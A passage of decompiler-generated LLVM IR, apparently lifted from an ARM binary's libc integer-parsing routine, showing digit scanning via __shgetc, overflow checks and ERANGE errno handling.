  %v0_116c4 = phi i32 [ %v1_11670, %bb196 ], [ %v0_116a8122, %bb186 ], [ %v0_116a8122, %bb187 ]
  %v0_116d8 = phi i32 [ %v4_11694, %bb196 ], [ %v4_114a8, %bb186 ], [ %v4_114a8, %bb187 ]
  %v0_116cc = phi i32 [ %v1_1169c, %bb196 ], [ 0, %bb186 ], [ 0, %bb187 ]
  store i32 %storemerge, i32* @r6, align 4
  store i32 %v0_116cc, i32* @r7, align 4
  store i32 %v1_1145c, i32* %r2.global-to-local, align 4
  %v3_116a4 = icmp ult i32 %v0_116d8, %v1_1145c
  %v1_116a8 = sub i32 32, %v0_116c4
  store i32 %v1_116a8, i32* @sb, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  br i1 %v3_116a4, label %dec_label_pc_116b8, label %dec_label_pc_1170c

dec_label_pc_116b8:                               ; preds = %dec_label_pc_116a0
  %v6_116b8 = lshr i32 -1, %v0_116c4
  %v7_116c0 = shl i32 -1, %v1_116a8
  %v8_116c0 = or i32 %v7_116c0, %v6_116b8
  store i32 %v8_116c0, i32* %r2.global-to-local, align 4
  %v1_116c4 = add i32 %v0_116c4, -32
  store i32 %v1_116c4, i32* @r8, align 4
  %v6_116c4 = icmp slt i32 %v1_116c4, 0
  br i1 %v6_116c4, label %bb198, label %bb197

bb197:                                            ; preds = %dec_label_pc_116b8
  %v7_116c8 = lshr i32 -1, %v1_116c4
  store i32 %v7_116c8, i32* %r2.global-to-local, align 4
  br label %bb198

bb198:                                            ; preds = %dec_label_pc_116b8, %bb197
  %v1_117e4 = phi i32 [ %v8_116c0, %dec_label_pc_116b8 ], [ %v7_116c8, %bb197 ]
  %tmp239 = icmp ugt i32 %v0_116cc, %v6_116b8
  br i1 %tmp239, label %dec_label_pc_116d4, label %dec_label_pc_11654

dec_label_pc_116d4:                               ; preds = %bb198
  store i32 %v1_1145c, i32* @r4, align 4
  br label %dec_label_pc_11788

dec_label_pc_116e0:                               ; preds = %dec_label_pc_1177c
  %v0_116e0 = call i32 @__errno_location()
  store i32 %v0_116e0, i32* %r0.global-to-local, align 4
  %v3_116e4 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_116e4, i32* %r1.global-to-local, align 4
  %v1_116e8 = urem i32 %v3_116e4, 2
  store i32 34, i32* %r2.global-to-local, align 4
  %v2_116f0 = icmp eq i32 %v1_116e8, 0
  %v2_116f4 = inttoptr i32 %v0_116e0 to i32*
  store i32 34, i32* %v2_116f4, align 4
  br i1 %v2_116f0, label %dec_label_pc_119b8, label %dec_label_pc_116fc

dec_label_pc_116fc:                               ; preds = %dec_label_pc_116e0
  %v0_116fc = load i32, i32* %r2.global-to-local, align 4
  %v1_116fc = add i32 %v0_116fc, -34
  store i32 %v1_116fc, i32* %r2.global-to-local, align 4
  %v2_11704 = load i32, i32* %stack_var_0, align 4
  store i32 %v2_11704, i32* @r6, align 4
  store i32 %arg5, i32* @r7, align 4
  br label %dec_label_pc_1170c

dec_label_pc_1170c:                               ; preds = %dec_label_pc_116a0, %dec_label_pc_117fc, %dec_label_pc_117f0, %dec_label_pc_118f4, %dec_label_pc_118ec, %dec_label_pc_119b8, %dec_label_pc_116fc
  %v1_11724232 = phi i32 [ %arg5, %dec_label_pc_119b8 ], [ %arg5, %dec_label_pc_116fc ], [ %v0_11928, %dec_label_pc_118ec ], [ 0, %dec_label_pc_117f0 ], [ %v0_11928, %dec_label_pc_118f4 ], [ %v0_116cc, %dec_label_pc_116a0 ], [ %v5_1180c, %dec_label_pc_117fc ]
  %stack_var_-44.2 = phi i32 [ %stack_var_-44.1, %dec_label_pc_119b8 ], [ %v1_116fc, %dec_label_pc_116fc ], [ %stack_var_-44.1, %dec_label_pc_118ec ], [ %stack_var_-44.1, %dec_label_pc_117f0 ], [ %stack_var_-44.1, %dec_label_pc_118f4 ], [ %stack_var_-44.1, %dec_label_pc_116a0 ], [ %stack_var_-44.1, %dec_label_pc_117fc ]
  %v0_1170c = load i32, i32* @sl, align 4
  %v1_1170c = add i32 %v0_1170c, 104
  %v2_1170c = inttoptr i32 %v1_1170c to i32*
  %v3_1170c = load i32, i32* %v2_1170c, align 4
  %v2_11710 = icmp eq i32 %v3_1170c, 0
  br i1 %v2_11710, label %.thread47, label %bb199

bb199:                                            ; preds = %dec_label_pc_1170c
  %v2_11714 = add i32 %v0_1170c, 4
  %v3_11714 = inttoptr i32 %v2_11714 to i32*
  %v4_11714 = load i32, i32* %v3_11714, align 4
  %v2_11718 = add i32 %v4_11714, -1
  store i32 %v2_11718, i32* %v3_11714, align 4
  %v1_11724.pre = load i32, i32* @r7, align 4
  br label %.thread47

.thread47:                                        ; preds = %dec_label_pc_1170c, %bb199
  %v1_11724 = phi i32 [ %v1_11724232, %dec_label_pc_1170c ], [ %v1_11724.pre, %bb199 ]
  %v3_11724 = icmp ule i32 %v1_11724, %arg5
  %v9_11724 = icmp eq i32 %v1_11724, %arg5
  %v2_11728 = xor i1 %v9_11724, true
  %v3_11728 = and i1 %v3_11724, %v2_11728
  br i1 %v3_11728, label %dec_label_pc_117b4, label %dec_label_pc_1172c

dec_label_pc_1172c:                               ; preds = %.thread47
  %v3_119fc = load i32, i32* %stack_var_0, align 4
  br i1 %v9_11724, label %dec_label_pc_119fc, label %dec_label_pc_11730

dec_label_pc_11730:                               ; preds = %dec_label_pc_1172c, %dec_label_pc_119fc
  store i32 %v3_119fc, i32* %r1.global-to-local, align 4
  %v1_11738 = urem i32 %v3_119fc, 2
  %v2_1173c = or i32 %v1_11738, %stack_var_-44.2
  store i32 %v2_1173c, i32* %r2.global-to-local, align 4
  %v4_1173c = icmp eq i32 %v2_1173c, 0
  br i1 %v4_1173c, label %dec_label_pc_119c4, label %dec_label_pc_11744

dec_label_pc_11744:                               ; preds = %dec_label_pc_11730
  store i32 %arg5, i32* @r2, align 4
  %tmp240 = icmp ugt i32 %v1_11724, %arg5
  br i1 %tmp240, label %dec_label_pc_11750, label %dec_label_pc_117b0

dec_label_pc_11750:                               ; preds = %dec_label_pc_11a0c, %dec_label_pc_11744
  %v0_11750 = call i32 @__errno_location()
  store i32 34, i32* @r3, align 4
  %v2_11758 = inttoptr i32 %v0_11750 to i32*
  store i32 34, i32* %v2_11758, align 4
  %v2_11760 = load i32, i32* %stack_var_0, align 4
  store i32 %v2_11760, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11614

dec_label_pc_11770:                               ; preds = %.thread48.dec_label_pc_11770_crit_edge, %dec_label_pc_117a0
  %v0_11774 = phi i32 [ %v0_11774.pre, %.thread48.dec_label_pc_11770_crit_edge ], [ %v1_1176c, %dec_label_pc_117a0 ]
  %v1_11778 = add i32 %v0_11774, add (i32 ptrtoint (i32* @global_var_19dc5.617 to i32), i32 1)
  %v2_11778 = inttoptr i32 %v1_11778 to i8*
  %v3_11778 = load i8, i8* %v2_11778, align 1
  %v4_11778 = zext i8 %v3_11778 to i32
  store i32 %v4_11778, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_1177c

dec_label_pc_1177c:                               ; preds = %dec_label_pc_11898, %dec_label_pc_1188c.dec_label_pc_1177c.loopexit207_crit_edge, %dec_label_pc_117e4, %.thread145, %dec_label_pc_11770
  %v0_11780 = phi i32 [ %v4_11778, %dec_label_pc_11770 ], [ %v6_118f8, %.thread145 ], [ %v0_116d8, %dec_label_pc_117e4 ], [ %v0_11780.pre.pre, %dec_label_pc_1188c.dec_label_pc_1177c.loopexit207_crit_edge ], [ %v0_1184c, %dec_label_pc_11898 ]
  %stack_var_-60.2.off0 = phi i32 [ %stack_var_-60.3.off0, %dec_label_pc_11770 ], [ 10, %.thread145 ], [ %v1_1145c, %dec_label_pc_117e4 ], [ %v1_1145c, %dec_label_pc_1188c.dec_label_pc_1177c.loopexit207_crit_edge ], [ %v1_1145c, %dec_label_pc_11898 ]
  store i32 %stack_var_-60.2.off0, i32* @r4, align 4
  %v3_11780 = icmp ult i32 %v0_11780, %stack_var_-60.2.off0
  br i1 %v3_11780, label %dec_label_pc_11788, label %dec_label_pc_116e0

dec_label_pc_11788:                               ; preds = %dec_label_pc_1177c, %dec_label_pc_116d4
  %stack_var_-60.3.off0 = phi i32 [ %stack_var_-60.2.off0, %dec_label_pc_1177c ], [ %v1_1145c, %dec_label_pc_116d4 ]
  %v0_11788 = load i32, i32* @sl, align 4
  %v1_11788 = add i32 %v0_11788, 4
  %v2_11788 = inttoptr i32 %v1_11788 to i32*
  %v3_11788 = load i32, i32* %v2_11788, align 4
  store i32 %v3_11788, i32* %r2.global-to-local, align 4
  %v1_1178c = add i32 %v0_11788, 104
  %v2_1178c = inttoptr i32 %v1_1178c to i32*
  %v3_1178c = load i32, i32* %v2_1178c, align 4
  %v3_11790 = icmp ult i32 %v3_11788, %v3_1178c
  br i1 %v3_11790, label %.thread48.dec_label_pc_11770_crit_edge, label %dec_label_pc_117a0

.thread48.dec_label_pc_11770_crit_edge:           ; preds = %dec_label_pc_11788
  %v2_11794 = inttoptr i32 %v3_11788 to i8*
  %v3_11794 = load i8, i8* %v2_11794, align 1
  %v4_11794 = zext i8 %v3_11794 to i32
  store i32 %v4_11794, i32* %r0.global-to-local, align 4
  %v6_11794 = add i32 %v3_11788, 1
  store i32 %v6_11794, i32* %r2.global-to-local, align 4
  store i32 %v6_11794, i32* %v2_11788, align 4
  %v0_11774.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11770

dec_label_pc_117a0:                               ; preds = %dec_label_pc_11788
  store i32 %v0_11788, i32* %r0.global-to-local, align 4
  %v1_1176c = call i32 @__shgetc(i32 %v0_11788)
  store i32 %v1_1176c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11770

dec_label_pc_117a4:                               ; preds = %dec_label_pc_11658
  store i32 %v0_11658, i32* %r0.global-to-local, align 4
  %v1_117a8 = call i32 @__shgetc(i32 %v0_11658)
  store i32 %v1_117a8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11670

dec_label_pc_117b0:                               ; preds = %dec_label_pc_11744
  br i1 %v9_11724, label %dec_label_pc_11a0c, label %dec_label_pc_117b4

dec_label_pc_117b4:                               ; preds = %dec_label_pc_11a0c, %dec_label_pc_119fc, %dec_label_pc_117b0, %.thread47
  store i32 %stack_var_-44.2, i32* @r3, align 4
  %v3_117bc = ashr i32 %stack_var_-44.2, 31
  %v1_117c0 = load i32, i32* @r6, align 4
  %v2_117c0 = xor i32 %v1_117c0, %stack_var_-44.2
  %v2_117c4 = xor i32 %v1_11724, %v3_117bc
  %v2_117c8 = sub i32 %v2_117c0, %stack_var_-44.2
  %v3_117c8 = icmp uge i32 %v2_117c0, %stack_var_-44.2
  %v3_117cc = icmp eq i1 %v3_117c8, false
  %v4_117cc = sub i32 %v2_117c4, %v3_117bc
  %v6_117cc = sext i1 %v3_117cc to i32
  %v7_117cc = add i32 %v6_117cc, %v4_117cc
  store i32 %v7_117cc, i32* @r2, align 4
  store i32 %v2_117c8, i32* %stack_var_0, align 4
  store i32 %v2_117c8, i32* %r0.global-to-local, align 4
  store i32 %v7_117cc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11614

dec_label_pc_117e4:                               ; preds = %dec_label_pc_11654
  %tmp241 = icmp ugt i32 %storemerge, %v1_117e4
  br i1 %tmp241, label %dec_label_pc_1177c, label %dec_label_pc_11658

dec_label_pc_117f0:                               ; preds = %bb189, %.dec_label_pc_117f0_crit_edge
  store i32 %v0_117f0, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  %v3_1181462 = icmp ult i32 %v0_1181460, %v1_1145c
  br i1 %v3_1181462, label %dec_label_pc_11840, label %dec_label_pc_1170c

dec_label_pc_117fc:                               ; preds = %.thread50.dec_label_pc_117fc_crit_edge, %dec_label_pc_11880
  %v0_11800 = phi i32 [ %v0_11800.pre, %.thread50.dec_label_pc_117fc_crit_edge ], [ %v1_11884, %dec_label_pc_11880 ]
  %v0_11804 = load i32, i32* @r4, align 4
  %v1_11804 = load i32, i32* @r8, align 4
  %v2_11804 = add i32 %v1_11804, %v0_11804
  store i32 %v2_11804, i32* @r6, align 4
  %v3_11804 = icmp ult i32 %v2_11804, %v0_11804
  %v1_11808 = add i32 %v0_11800, add (i32 ptrtoint (i32* @global_var_19dc5.617 to i32), i32 1)
  %v2_11808 = inttoptr i32 %v1_11808 to i8*
  %v3_11808 = load i8, i8* %v2_11808, align 1
  %v4_11808 = zext i8 %v3_11808 to i32
  store i32 %v4_11808, i32* %fp.global-to-local, align 4
  %v0_1180c = load i32, i32* @r5, align 4
  %v1_1180c = load i32, i32* @sb, align 4
  %v4_1180c = zext i1 %v3_11804 to i32
  %v3_1180c = add i32 %v0_1180c, %v4_1180c
  %v5_1180c = add i32 %v3_1180c, %v1_1180c
  store i32 %v5_1180c, i32* @r7, align 4
  %v3_11814 = icmp ult i32 %v4_11808, %v1_1145c
  br i1 %v3_11814, label %dec_label_pc_11840, label %dec_label_pc_1170c

dec_label_pc_11840:                               ; preds = %dec_label_pc_117fc, %dec_label_pc_117f0
  store i32 %v1_1145c, i32* @r4, align 4
  store i32 -1, i32* @r0, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %v1_1145c, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v5_11834 = call i32 @__aeabi_uldivmod(i32 -1, i32 -1, i32 %v1_1145c, i32 0)
  store i32 %v5_11834, i32* %r0.global-to-local, align 4
  %v0_11838 = load i32, i32* @r7, align 4
  %v3_11838 = icmp eq i32 %v0_11838, -1
  %v0_1188c = load i32, i32* @r6, align 4
  br i1 %v3_11838, label %dec_label_pc_1188c, label %dec_label_pc_11864

dec_label_pc_11864:                               ; preds = %dec_label_pc_11840, %dec_label_pc_1188c
  %v1_11844 = zext i32 %v0_1188c to i64
  %v2_11844 = load i32, i32* @r4, align 4
  %v3_11844 = zext i32 %v2_11844 to i64
  %v4_11844 = mul nuw i64 %v3_11844, %v1_11844
  %v5_11844 = udiv i64 %v4_11844, 4294967296
  %v6_11844 = trunc i64 %v5_11844 to i32
  %v7_11844 = trunc i64 %v4_11844 to i32
  store i32 %v7_11844, i32* @r8, align 4
  %v3_11848 = mul i32 %v2_11844, %v0_11838
  %v4_11848 = add i32 %v6_11844, %v3_11848
  store i32 %v4_11848, i32* @sb, align 4
  %v0_1184c = load i32, i32* %fp.global-to-local, align 4
  %v1_1184c = urem i32 %v0_1184c, 256
  store i32 %v1_1184c, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  %v3_11858 = icmp eq i32 %v4_11848, -1
  %v0_1184c.not = or i32 %v0_1184c, -256
  %v1_1185c = xor i32 %v0_1184c.not, 255
  store i32 %v1_1185c, i32* %r2.global-to-local, align 4
  br i1 %v3_11858, label %dec_label_pc_11898, label %dec_label_pc_11868

dec_label_pc_11868:                               ; preds = %dec_label_pc_11898, %dec_label_pc_11864
  %v0_11868 = load i32, i32* @sl, align 4
  %v1_11868 = add i32 %v0_11868, 4
  %v2_11868 = inttoptr i32 %v1_11868 to i32*
  %v3_11868 = load i32, i32* %v2_11868, align 4
  store i32 %v3_11868, i32* %r2.global-to-local, align 4
  %v1_1186c = add i32 %v0_11868, 104
  %v2_1186c = inttoptr i32 %v1_1186c to i32*
  %v3_1186c = load i32, i32* %v2_1186c, align 4
  %v3_11870 = icmp ult i32 %v3_11868, %v3_1186c
  br i1 %v3_11870, label %.thread50.dec_label_pc_117fc_crit_edge, label %dec_label_pc_11880

.thread50.dec_label_pc_117fc_crit_edge:           ; preds = %dec_label_pc_11868
  %v2_11874 = inttoptr i32 %v3_11868 to i8*
  %v3_11874 = load i8, i8* %v2_11874, align 1
  %v4_11874 = zext i8 %v3_11874 to i32
  store i32 %v4_11874, i32* %r0.global-to-local, align 4
  %v6_11874 = add i32 %v3_11868, 1
  store i32 %v6_11874, i32* %r2.global-to-local, align 4
  store i32 %v6_11874, i32* %v2_11868, align 4
  %v0_11800.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_117fc

dec_label_pc_11880:                               ; preds = %dec_label_pc_11868
  store i32 %v0_11868, i32* %r0.global-to-local, align 4
  %v1_11884 = call i32 @__shgetc(i32 %v0_11868)
  store i32 %v1_11884, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_117fc

dec_label_pc_1188c:                               ; preds = %dec_label_pc_11840
  %tmp242 = icmp ugt i32 %v0_1188c, %v5_11834
  br i1 %tmp242, label %dec_label_pc_1188c.dec_label_pc_1177c.loopexit207_crit_edge, label %dec_label_pc_11864

dec_label_pc_1188c.dec_label_pc_1177c.loopexit207_crit_edge: ; preds = %dec_label_pc_1188c
  %v0_11780.pre.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_1177c

dec_label_pc_11898:                               ; preds = %dec_label_pc_11864
  %tmp243 = icmp ugt i32 %v7_11844, %v1_1185c
  br i1 %tmp243, label %dec_label_pc_1177c, label %dec_label_pc_11868

dec_label_pc_118a4:                               ; preds = %dec_label_pc_113d4
  store i32 %v0_113d4, i32* %r0.global-to-local, align 4
  %v1_118a8 = call i32 @__shgetc(i32 %v0_113d4)
  store i32 %v1_118a8, i32* %r0.global-to-local, align 4
  store i32 %v1_118a8, i32* @r5, align 4
  br label %dec_label_pc_113ec

dec_label_pc_118b4:                               ; preds = %bb193
  store i32 %v0_118b4, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_118bc

dec_label_pc_118bc:                               ; preds = %dec_label_pc_11984, %dec_label_pc_118b4
  %v0_118f8 = phi i32 [ %v0_11994, %dec_label_pc_11984 ], [ %v0_115a0, %dec_label_pc_118b4 ]
  %v0_11924 = phi i32 [ %v2_1198c, %dec_label_pc_11984 ], [ %v0_118b4, %dec_label_pc_118b4 ]
  %v0_11928 = phi i32 [ %v5_11990, %dec_label_pc_11984 ], [ 0, %dec_label_pc_118b4 ]
  %v0_118ec = phi i32 [ %v1_11994, %dec_label_pc_11984 ], [ %v1_115a0, %dec_label_pc_118b4 ]
  %v2_118c0 = icmp ugt i32 %v0_118ec, 8
  %v7_118c0 = icmp eq i32 %v0_118ec, 9
  %v2_118c4 = xor i1 %v7_118c0, true
  %v3_118c4 = and i1 %v2_118c0, %v2_118c4
  br i1 %v3_118c4, label %bb200, label %bb201

bb200:                                            ; preds = %dec_label_pc_118bc
  store i32 0, i32* @r2, align 4
  br label %bb201

bb201:                                            ; preds = %dec_label_pc_118bc, %bb200
  %v2_118c8 = xor i1 %v2_118c0, true
  %v3_118c8 = or i1 %v7_118c0, %v2_118c8
  br i1 %v3_118c8, label %bb202, label %bb203

bb202:                                            ; preds = %bb201
  store i32 1, i32* @r2, align 4
  br label %bb203

bb203:                                            ; preds = %bb201, %bb202
  %v3_118cc = icmp ugt i32 %v0_11928, 429496728
  %v9_118cc = icmp eq i32 %v0_11928, 429496729
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_118d4 = xor i1 %v9_118cc, true
  %v3_118d4 = and i1 %v3_118cc, %v2_118d4
  br i1 %v3_118d4, label %dec_label_pc_118e0, label %dec_label_pc_118d8

dec_label_pc_118d8:                               ; preds = %bb203
  br i1 %v9_118cc, label %dec_label_pc_1190c, label %dec_label_pc_118dc

dec_label_pc_118dc:                               ; preds = %dec_label_pc_1190c, %dec_label_pc_118d8
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_118e0

dec_label_pc_118e0:                               ; preds = %dec_label_pc_1190c, %bb203, %dec_label_pc_118dc
  %v1_118e0 = phi i32 [ 0, %dec_label_pc_1190c ], [ 0, %bb203 ], [ 1, %dec_label_pc_118dc ]
  %v0_118e0 = load i32, i32* @r2, align 4
  %v2_118e0 = and i32 %v0_118e0, %v1_118e0
  %v2_118e4 = icmp eq i32 %v2_118e0, 0
  br i1 %v2_118e4, label %dec_label_pc_118ec, label %dec_label_pc_11924

dec_label_pc_118ec:                               ; preds = %dec_label_pc_119ac, %dec_label_pc_118e0, %dec_label_pc_11924
  br i1 %v3_118c4, label %dec_label_pc_1170c, label %dec_label_pc_118f4

dec_label_pc_118f4:                               ; preds = %dec_label_pc_118ec
  store i32 ptrtoint (i32* @global_var_19dc6.615 to i32), i32* %r0.global-to-local, align 4
  %v2_118f8 = add i32 %v0_118f8, ptrtoint (i32* @global_var_19dc6.615 to i32)
  %v3_118f8 = inttoptr i32 %v2_118f8 to i8*
  %v4_118f8 = load i8, i8* %v3_118f8, align 1
  %v6_118f8 = zext i8 %v4_118f8 to i32
  %tmp244 = icmp ult i8 %v4_118f8, 10
  br i1 %tmp244, label %.thread145, label %dec_label_pc_1170c

.thread145:                                       ; preds = %dec_label_pc_118f4
  store i32 %v6_118f8, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_1177c

dec_label_pc_1190c:                               ; preds = %dec_label_pc_118d8
  %tmp245 = icmp ugt i32 %v0_11924, -1717986919
  br i1 %tmp245, label %dec_label_pc_118e0, label %dec_label_pc_118dc

dec_label_pc_11924:                               ; preds = %dec_label_pc_118e0
  %v2_11924 = mul i32 %v0_11924, 2
  store i32 %v2_11924, i32* %r1.global-to-local, align 4
  %v3_11924 = icmp ult i32 %v2_11924, %v0_11924
  %v3_11928 = mul i32 %v0_11928, 2
  %v4_11928 = zext i1 %v3_11924 to i32
  %v5_11928 = or i32 %v4_11928, %v3_11928
  store i32 %v5_11928, i32* %r2.global-to-local, align 4
  %v3_11930 = mul i32 %v5_11928, 4
  %tmp205 = udiv i32 %v0_11924, 536870912
  %v4_11934 = urem i32 %tmp205, 4
  %v5_11934 = or i32 %v3_11930, %v4_11934
  %v2_11940 = mul i32 %v0_11924, 10
  store i32 %v2_11940, i32* @r8, align 4
  %v1_11948 = and i32 %v0_118ec, 1073741824
  %v2_11948 = icmp ne i32 %v1_11948, 0
  %v3_11948 = ashr i32 %v0_118ec, 31
  %v4_11954 = zext i1 %v2_11948 to i32
  %v3_11954 = add i32 %v4_11954, %v5_11928
  %v5_11954 = add i32 %v3_11954, %v5_11934
  store i32 %v5_11954, i32* @sb, align 4
  %tmp246 = lshr i32 %v0_118ec, 31
  %v1_11958 = add nsw i32 %tmp246, -1
  store i32 %v1_11958, i32* @r4, align 4
  %v3_1195c = icmp uge i32 %v5_11954, %v1_11958
  %v9_1195c = icmp eq i32 %v5_11954, %v1_11958
  %v1_11960 = sub i32 -1, %v0_118ec
  %v2_11964 = xor i1 %v9_1195c, true
  %v3_11964 = and i1 %v3_1195c, %v2_11964
  br i1 %v3_11964, label %dec_label_pc_118ec, label %dec_label_pc_11968

dec_label_pc_11968:                               ; preds = %dec_label_pc_11924
  br i1 %v9_1195c, label %dec_label_pc_119ac, label %dec_label_pc_1196c

dec_label_pc_1196c:                               ; preds = %dec_label_pc_119ac, %dec_label_pc_11968
  %v0_1196c = load i32, i32* @sl, align 4
  %v1_1196c = add i32 %v0_1196c, 4
  %v2_1196c = inttoptr i32 %v1_1196c to i32*
  %v3_1196c = load i32, i32* %v2_1196c, align 4
  store i32 %v3_1196c, i32* %r2.global-to-local, align 4
  %v1_11970 = add i32 %v0_1196c, 104
  %v2_11970 = inttoptr i32 %v1_11970 to i32*
  %v3_11970 = load i32, i32* %v2_11970, align 4
  %v3_11974 = icmp ult i32 %v3_1196c, %v3_11970
  br i1 %v3_11974, label %.thread52.dec_label_pc_11984_crit_edge, label %dec_label_pc_1199c

.thread52.dec_label_pc_11984_crit_edge:           ; preds = %dec_label_pc_1196c
  %v2_11978 = inttoptr i32 %v3_1196c to i8*
  %v3_11978 = load i8, i8* %v2_11978, align 1
  %v4_11978 = zext i8 %v3_11978 to i32
  store i32 %v4_11978, i32* @r5, align 4
  %v6_11978 = add i32 %v3_1196c, 1
  store i32 %v6_11978, i32* %r2.global-to-local, align 4
  store i32 %v6_11978, i32* %v2_1196c, align 4
  %v0_11994.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11984

dec_label_pc_11984:                               ; preds = %.thread52.dec_label_pc_11984_crit_edge, %dec_label_pc_1199c
  %v0_11994 = phi i32 [ %v0_11994.pre, %.thread52.dec_label_pc_11984_crit_edge ], [ %v1_119a0, %dec_label_pc_1199c ]
  store i32 %v0_118ec, i32* %r1.global-to-local, align 4
  store i32 %v3_11948, i32* @r2, align 4
  %v0_1198c = load i32, i32* @r8, align 4
  %v2_1198c = add i32 %v0_1198c, %v0_118ec
  store i32 %v2_1198c, i32* @r6, align 4
  %v3_1198c = icmp ult i32 %v2_1198c, %v0_1198c
  %v0_11990 = load i32, i32* @sb, align 4
  %v3_11990 = add i32 %v0_11990, %v3_11948
  %v4_11990 = zext i1 %v3_1198c to i32
  %v5_11990 = add i32 %v4_11990, %v3_11990
  store i32 %v5_11990, i32* @r7, align 4
  %v1_11994 = add i32 %v0_11994, -48
  store i32 %v1_11994, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_118bc

dec_label_pc_1199c:                               ; preds = %dec_label_pc_1196c
  store i32 %v0_1196c, i32* %r0.global-to-local, align 4
  %v1_119a0 = call i32 @__shgetc(i32 %v0_1196c)
  store i32 %v1_119a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11984

dec_label_pc_119ac:                               ; preds = %dec_label_pc_11968
  %tmp247 = icmp ugt i32 %v2_11940, %v1_11960
  br i1 %tmp247, label %dec_label_pc_118ec, label %dec_label_pc_1196c

dec_label_pc_119b8:                               ; preds = %dec_label_pc_116e0
  %v2_119bc = load i32, i32* %stack_var_0, align 4
  store i32 %v2_119bc, i32* @r6, align 4
  store i32 %arg5, i32* @r7, align 4
  br label %dec_label_pc_1170c

dec_label_pc_119c4:                               ; preds = %dec_label_pc_11730
  %v0_119c4 = call i32 @__errno_location()
  %v2_119cc = load i32, i32* %stack_var_0, align 4
  store i32 -1, i32* @r3, align 4
  %v2_119d4 = add i32 %v2_119cc, -1
  %v3_119d4 = icmp ne i32 %v2_119cc, 0
  %v3_119dc = add i32 %arg5, -1
  %v4_119dc = zext i1 %v3_119d4 to i32
  %v5_119dc = add i32 %v3_119dc, %v4_119dc
  store i32 %v2_119d4, i32* %stack_var_0, align 4
  store i32 34, i32* @r2, align 4
  %v2_119ec = inttoptr i32 %v0_119c4 to i32*
  store i32 34, i32* %v2_119ec, align 4
  %v2_119f4 = load i32, i32* %stack_var_0, align 4
  store i32 %v2_119f4, i32* %r0.global-to-local, align 4
  store i32 %v5_119dc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11614

dec_label_pc_119fc:                               ; preds = %dec_label_pc_1172c
  %v1_11a00 = load i32, i32* @r6, align 4
  %tmp248 = icmp ugt i32 %v3_119fc, %v1_11a00
  br i1 %tmp248, label %dec_label_pc_117b4, label %dec_label_pc_11730

dec_label_pc_11a0c:                               ; preds = %dec_label_pc_117b0
  %v0_11a10 = load i32, i32* @r6, align 4
  %tmp249 = icmp ugt i32 %v0_11a10, %v3_119fc
  br i1 %tmp249, label %dec_label_pc_11750, label %dec_label_pc_117b4

dec_label_pc_11a1c:                               ; preds = %dec_label_pc_114dc
  store i32 %v0_114dc, i32* %r0.global-to-local, align 4
  %v1_11a20 = call i32 @__shgetc(i32 %v0_114dc)
  store i32 %v1_11a20, i32* %r0.global-to-local, align 4
  store i32 %v1_11a20, i32* @r5, align 4
  br label %dec_label_pc_114f4

dec_label_pc_11a2c:                               ; preds = %dec_label_pc_114f4
  %v0_11a2c = load i32, i32* @sl, align 4
  %v1_11a2c = add i32 %v0_11a2c, 4
  %v2_11a2c = inttoptr i32 %v1_11a2c to i32*
  %v3_11a2c = load i32, i32* %v2_11a2c, align 4
  store i32 %v3_11a2c, i32* %r2.global-to-local, align 4
  %v1_11a30 = add i32 %v0_11a2c, 104
  %v2_11a30 = inttoptr i32 %v1_11a30 to i32*
  %v3_11a30 = load i32, i32* %v2_11a30, align 4
  %v3_11a34 = icmp ult i32 %v3_11a2c, %v3_11a30
  br i1 %v3_11a34, label %.thread54.dec_label_pc_11a44_crit_edge, label %dec_label_pc_11aac

.thread54.dec_label_pc_11a44_crit_edge:           ; preds = %dec_label_pc_11a2c
  %v2_11a38 = inttoptr i32 %v3_11a2c to i8*
  %v3_11a38 = load i8, i8* %v2_11a38, align 1
  %v4_11a38 = zext i8 %v3_11a38 to i32
  store i32 %v4_11a38, i32* %r0.global-to-local, align 4
  %v6_11a38 = add i32 %v3_11a2c, 1
  store i32 %v6_11a38, i32* %r2.global-to-local, align 4
  store i32 %v6_11a38, i32* %v2_11a2c, align 4
  %v0_11a48.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11a44

dec_label_pc_11a44:                               ; preds = %.thread54.dec_label_pc_11a44_crit_edge, %dec_label_pc_11aac
  %v0_11a48 = phi i32 [ %v0_11a48.pre, %.thread54.dec_label_pc_11a44_crit_edge ], [ %v1_11ab0, %dec_label_pc_11aac ]
  %v2_11a48 = add i32 %v0_11a48, ptrtoint (i32* @global_var_19dc6.615 to i32)
  %v3_11a48 = inttoptr i32 %v2_11a48 to i8*
  %v4_11a48 = load i8, i8* %v3_11a48, align 1
  %v6_11a48 = zext i8 %v4_11a48 to i32
  store i32 %v6_11a48, i32* %fp.global-to-local, align 4
  %tmp250 = icmp ult i8 %v4_11a48, 16
  br i1 %tmp250, label %.thread156, label %dec_label_pc_11a60

.thread156:                                       ; preds = %dec_label_pc_11a44
  store i32 16, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1145c

dec_label_pc_11a60:                               ; preds = %dec_label_pc_11a44
  %v0_11a60 = load i32, i32* @sl, align 4
  %v1_11a60 = add i32 %v0_11a60, 104
  %v2_11a60 = inttoptr i32 %v1_11a60 to i32*
  %v3_11a60 = load i32, i32* %v2_11a60, align 4
